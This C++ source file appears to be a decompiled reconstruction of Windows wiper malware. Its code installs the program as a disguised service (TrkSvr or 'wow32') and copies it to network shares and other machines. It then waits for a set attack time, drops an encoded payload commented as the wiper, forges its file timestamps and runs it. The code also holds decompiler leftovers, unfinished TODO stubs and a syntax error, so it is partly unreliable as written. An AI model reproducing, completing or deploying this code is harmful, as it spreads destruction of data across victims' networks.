/******************************************************************************************
  Copyright 2013 Christian Roggia

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
******************************************************************************************/

// MODIFIED BY mic.ric.tor
#include "5.h"
#include "0.h"
#include "2.h"
#include "3.h"
#include "4.h"
#include "Service.h"

using namespace sc::service;

/** ----->> TODO: Understand what kind of std:: class is <<----- **/
//std::basic_ios<char> byte_41E2E0;

bool LaunchAttack()
{
	char *v12; // [sp+C8h] [bp-218h]@1
	WCHAR svc_path[250]; // [sp+D0h] [bp-210h]@4

	v12 = ATT_RANDOM;

	/** ----->> TODO: Understand what kind of std:: class is <<----- **/
	//std::vector<> v9(byte_41E2E0);

	/** ----->> TODO: Check this part <<----- **/
	/*std::ofstream v6("c:\\windows\\temp\\out17626867.txt");
	if(v6.is_open())
	{
		v6.write(v12, strlen(v12));
		v6.close();
	}*/
	/** ------>> TODO: End of part to check <<-----**/

	g_svc_id = NULL
	g_svc_id = SearchProcessByIdOrName(g_svc_id, g_svc_name);
	if(!g_svc_id)
	{
		if(!GetRandomServiceInfo(g_svc_name, svc_path))
			return false;

		if(!WriteEncodedResource(svc_path, 0, (LPCWSTR)0x70, L"PKCS12", g_keys[KEY_PKCS12], 4)) // Wiper
		{
			Exploit();
			return true;
		}

		SetReliableFileTime(svc_path);

		g_svc_id = 0;
		if(StartServiceProcess(g_svc_name, svc_path, &g_svc_id)) // Execute the wiper
		{
			Exploit();
		}


		return true;
	}
	else
	{
		Exploit();
	}

	return false;
}

inline bool Exploit()
{
	HANDLE img = LoadImageW(NULL, L"myimage12767", IMAGE_BITMAP, 0, 0, LR_MONOCHROME);
	if(img)
	{
		/** ----->> TODO: Understand what kind of std:: class is <<----- **/
		//sub_404D73(byte_41E2E0, img, 18, 0);
	}
	else
	{
		char *v5 = new char[25];

		memset(v5, 64, 20);
		/** ----->> TODO: Understand what kind of std:: class is <<----- **/
		//sub_404D73(byte_41E2E0, v5, 18, 0);

		if(v5) delete [] v5;
	}
}

bool Run(BOOL is_service_running)
{
	HANDLE hObject; // [sp+8h] [bp-4h]@2
	int time_to_attack; // [sp+14h] [bp+8h]@4

	if(is_service_running == TRUE)
	{
		g_ready_to_attack = false;

		InitializeCriticalSection(&g_critical_section);
		SvcSleep(GetRandom() % 60 + 60);

		hObject = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RunServiceNetinit, NULL, 0, NULL);
		if(!bSvcStopped)
		{
			do
			{
				EnterCriticalSection(&g_critical_section);
				DeleteServiceExecutables();
				LeaveCriticalSection(&g_critical_section);

				if(g_ready_to_attack || (time_to_attack = TimeToAttack()) == 0)
				{
					g_ready_to_attack = true;

					EnterCriticalSection(&g_critical_section);
					LaunchAttack();
					LeaveCriticalSection(&g_critical_section);

					SvcSleep(GetRandom() % 60 + 120);
				}
				else
				{
					CopyCurrentExecutableToTrkSvr();
					SvcSleep(60 * time_to_attack + GetRandom() % 60);
				}
			}
			while(!bSvcStopped);
		}

		// Wait until the netinit function end
		if(hObject != NULL)
		{
			WaitForSingleObject(hObject, WAIT_FAILED);
			CloseHandle(hObject);
		}

		DeleteCriticalSection(&g_critical_section);
		return true;
	}

	if(g_argc <= 1)
		return CopyCurrentExecutableToTrkSvr();

	return (strlenW(g_argv[1]) == 1) ? WriteModuleOnSharedNetwork() : WriteModuleOnSharedPCByArgv();
}

int main(int argc, const char **argv, const char **envp)
{
	SERVICE_TABLE_ENTRYW ServiceStartTable; // [sp+4h] [bp-10h]@3

	GeneralSetup();
	if(SetupTrkSvrService())
		exit(0);

	// If our little TrkSvr shenanigans don't work, try again, but differently
	ServiceStartTable.lpServiceName = (LPWSTR)L"wow32";
	ServiceStartTable.lpServiceProc = (LPSERVICE_MAIN_FUNCTIONW)SvcMain;
	if(!StartServiceCtrlDispatcherW(&ServiceStartTable))
		Run(FALSE);

	ResetArgs();
	return 0;
}